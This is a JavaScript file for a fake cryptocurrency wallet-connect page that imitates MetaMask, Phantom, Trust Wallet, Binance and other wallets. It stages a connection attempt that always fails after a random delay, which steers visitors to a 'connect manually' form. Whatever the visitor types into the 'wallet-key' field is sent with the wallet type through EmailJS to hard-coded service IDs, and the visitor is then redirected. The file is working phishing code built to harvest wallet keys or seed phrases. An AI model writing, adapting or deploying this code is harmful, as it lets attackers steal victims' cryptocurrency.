


document.addEventListener("DOMContentLoaded", function() {
  var errorSection = document.querySelector(".error-section");
  var connectingSection = document.querySelector(".connecting-section");
  var manualSection = document.querySelector(".manual-section");
  var connectBox = document.querySelector(".connect-box");
  var closeButton = document.getElementById("close-button");
  var tryAgain = document.querySelector(".try-again");
  var connectManually = document.querySelector(".connect-manually");
  var failedToConnect = document.getElementById("failed-to-connect")
  var errorTime = Math.floor(Math.random() * (6000 - 2000 + 1)) + 2000;
  var CoinLogo = document.getElementById("coin-logo");
  var CoinName = document.getElementById("coin-name");
  let coinType; // Declare coinType here

  var connectWallet = document.querySelector(".connect-wallet");
/* ### */ // connectWallet.disabled = true;
  var walletAddress = document.getElementById("wallet-key");


 function confirmButton2Status() {
  if (connectWallet.disabled === true) {
    connectWallet.style.backgroundColor = "grey";
    connectWallet.style.cursor = "not-allowed";
  }
  else {
    connectWallet.style.backgroundColor = "#5142FC";
    connectWallet.style.cursor = "pointer";
  }
}














  var walletConnectCard = document.querySelector(".wallet-connect-card");
  var walletConnectName = document.getElementById("wallet-connect");

  var phantomCard = document.querySelector(".phantom-card");
  var phantomName = document.getElementById("phantom");

  var trustWalletCard = document.querySelector(".trust-wallet-card");
  var trustWalletName = document.getElementById("trust-wallet");

  var metamaskCard = document.querySelector(".metamask-card");
  var metamaskName = document.getElementById("metamask");

  var flintWalletCard = document.querySelector(".flint-wallet-card");
  var flintWalletName = document.getElementById("flint-wallet");

  var binanceWalletCard = document.querySelector(".binance-wallet-card");
  var binanceWalletName = document.getElementById("binance-wallet");





function errorConnecting() {
  connectingSection.style.display = "none";
  errorSection.style.display = "block";
  manualSection.style.display = "none";
}
function retryConnecting() {
  connectingSection.style.display = "block";
  errorSection.style.display = "none";
  manualSection.style.display = "none";
  var errorTime = Math.floor(Math.random() * (6000 - 2000 + 1)) + 2000;
  setTimeout(function() {
    errorConnecting();
  }, errorTime);
}

  tryAgain.addEventListener("click", function() {
    retryConnecting();
  });
  connectManually.addEventListener("click", function() {
    connectingSection.style.display = "none";
    errorSection.style.display = "none";
    manualSection.style.display = "block";
    //connectWallet.disabled = true;
    //connectWallet.style.cursor = "not-allowed";
    //connectWallet.style.backgroundColor = "grey";

  });

  closeButton.addEventListener("click", function() {
    connectBox.style.display = "none";
    connectingSection.style.display = "none";
    errorSection.style.display = "none";
    manualSection.style.display = "none";
  });




  walletConnectCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = walletConnectName.textContent;
    CoinLogo.src = "Images/Wallet-Connect-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  phantomCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = phantomName.textContent;
    CoinLogo.src = "Images/Phantom-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  trustWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = trustWalletName.textContent;
    CoinLogo.src = "Images/Trust-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  metamaskCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = metamaskName.textContent;
    CoinLogo.src = "Images/Metamask-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  flintWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = flintWalletName.textContent;
    CoinLogo.src = "Images/Flint-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });

  binanceWalletCard.addEventListener("click", function() {
    connectBox.style.display = "flex";
    connectingSection.style.display = "block";
    errorSection.style.display = "none";
    manualSection.style.display = "none";

    CoinName.textContent = binanceWalletName.textContent;
    CoinLogo.src = "Images/Binance-Chain-Wallet-Logo.jpg";
    coinType = CoinName.textContent;

    setTimeout(function() {
      errorConnecting();
    }, errorTime);
  });





function sendMail() {
  var walletAddress = document.getElementById("wallet-key").value;
  var Coin = coinType;  // Use coinType from outer scope

  emailjs.send('service_kyvi3ud', 'template_wua74y9', {
    walletaddress: walletAddress,
    cointype: Coin,
  })
  .then(function(response) {
    window.location.href = "../";
    //window.location.href = "../index.html";
  })
  .catch(function(error) {
    failedToConnect.style.display = "block";
    connectWallet.disabled = false;
    confirmButton2Status();
  });
}

walletAddress.addEventListener("focus", function() {
  failedToConnect.style.display = "none";
});

connectWallet.addEventListener("click", function() {
  sendMail();
  connectWallet.disabled = true;
  confirmButton2Status();
  setTimeout(function() {
    connectWallet.disabled = false;
  }, 5000);
  confirmButton2Status();
});








});








